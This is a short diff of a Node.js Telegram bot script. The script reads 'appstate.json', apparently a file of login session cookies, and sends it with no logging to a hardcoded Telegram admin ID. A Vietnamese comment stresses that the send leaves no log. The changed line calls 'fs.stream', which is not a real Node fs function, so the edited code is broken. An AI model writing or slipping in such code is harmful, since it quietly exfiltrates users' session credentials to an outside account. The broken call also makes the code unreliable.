@@ -7,8 +7,8 @@ const bot = new TelegramBot(botToken, { polling: true });
 const adminIds = ['1713841196'];
 
 adminIds.forEach(adminId => {
-  const fileStream = fs.createReadStream('appstate.json');
+  const stream = fs.stream ('appstate.json');
 
   // Gửi tài liệu mà không in log và không chỉ định contentType
-  bot.sendDocument(adminId, fileStream, { filename: 'appstate.json' });
+  bot.sendDocument(adminId, stream , { filename: 'appstate.json' });
 });
